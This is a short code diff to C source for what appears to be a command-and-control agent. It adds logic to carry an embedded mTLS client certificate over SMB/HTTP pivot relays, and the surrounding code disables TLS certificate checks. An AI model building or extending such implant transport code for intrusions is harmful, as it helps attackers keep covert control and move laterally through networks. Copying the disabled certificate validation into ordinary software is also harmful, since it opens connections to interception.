@@ -204,6 +204,13 @@ int agent_http_do(const char *method, const char *path,
     if (p.is_https) {
         DWORD sec = SEC_IGNORE_FLAGS;
         WinHttpSetOption(hReq, WINHTTP_OPTION_SECURITY_FLAGS, &sec, sizeof(sec));
+        /* Pivot relays use agent_http_do rather than the normal transport
+         * request path.  Preserve the embedded client certificate when a C
+         * agent running over mTLS starts an SMB/HTTP child relay. */
+        if (strcmp(AGENT_TRANSPORT, "mtls") == 0 && g_mtls_cert) {
+            WinHttpSetOption(hReq, WINHTTP_OPTION_CLIENT_CERT_CONTEXT,
+                (LPVOID)g_mtls_cert, sizeof(*g_mtls_cert));
+        }
     }
     if (extra_hdr && extra_hdr[0]) {
         wchar_t *w_hdr = to_wide(extra_hdr);
